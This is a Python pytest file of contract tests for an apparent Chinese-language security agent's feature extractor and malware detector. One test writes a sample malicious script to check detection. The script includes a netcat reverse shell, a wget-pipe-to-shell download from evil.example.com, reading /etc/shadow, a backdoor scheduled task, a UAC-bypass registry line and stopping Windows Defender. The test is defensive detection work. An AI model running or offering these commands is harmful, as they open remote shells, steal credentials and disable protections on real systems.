# -*- coding: utf-8 -*-
"""
玄鉴安全智能体 - AI 服务契约测试
验证特征抽取与恶意代码检测接口的稳定契约（CI 中由 pytest 执行）。
"""
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(__file__))

from features import extract_features, FEATURE_NAMES, feature_vector  # noqa: E402
from malware_detector import MalwareDetector  # noqa: E402


class TestFeatureContract:
    """特征抽取契约"""

    def test_feature_dimension_is_14(self):
        assert len(FEATURE_NAMES) == 14

    def test_extract_features_plain_file(self):
        """普通文本文件可抽取全部特征"""
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as f:
            f.write(b'hello world, this is a plain text document with no suspicious content inside.')
            path = f.name
        try:
            feats = extract_features(path)
            assert isinstance(feats, dict)
            for name in FEATURE_NAMES:
                assert name in feats, f'缺少特征 {name}'
        finally:
            os.unlink(path)

    def test_feature_vector_aligns_with_names(self):
        with tempfile.NamedTemporaryFile(suffix='.txt', delete=False) as f:
            f.write(b'just a test payload')
            path = f.name
        try:
            vec = feature_vector(extract_features(path))
            assert vec.shape == (1, 14)
        finally:
            os.unlink(path)


class TestMalwareDetectorContract:
    """恶意代码检测契约"""

    def _write_temp(self, content: bytes, suffix: str = '.exe'):
        f = tempfile.NamedTemporaryFile(suffix=suffix, delete=False)
        f.write(content)
        f.close()
        return f.name

    def test_missing_file_raises(self):
        detector = MalwareDetector()
        try:
            detector.detect('/nonexistent/path/definitely_missing.exe')
            assert False, '应抛出 FileNotFoundError'
        except FileNotFoundError:
            pass

    def test_clean_text_file_not_malicious(self):
        path = self._write_temp(
            b'Invoice summary for Q3 2026. Total amount: 12345.67 USD. '
            b'Please contact finance@example.com for questions.',
            '.txt',
        )
        try:
            result = MalwareDetector().detect(path)
            assert result['is_malicious'] is False
        finally:
            os.unlink(path)

    def test_malicious_script_detected(self):
        """含多个恶意特征的脚本应被判为恶意（确定性规则引擎）"""
        payload = (
            b'powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACkA\n'
            b'nc -e /bin/sh 10.0.0.5 4444\n'
            b'wget http://evil.example.com/payload.sh | sh\n'
            b'cat /etc/shadow\n'
            b'schtasks /create /tn backdoor\n'
            b'UAC bypass reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n'
            b'disable antivirus sc stop WinDefend\n'
        )
        path = self._write_temp(payload, '.ps1')
        try:
            result = MalwareDetector().detect(path)
            assert result['is_malicious'] is True, f'恶意脚本未被识别: {result}'
            assert result['score'] > 0.5
            assert result['method'] == 'rule_engine' or result['method'] == 'hybrid'
            assert isinstance(result['anomalies'], list) and len(result['anomalies']) > 0
        finally:
            os.unlink(path)
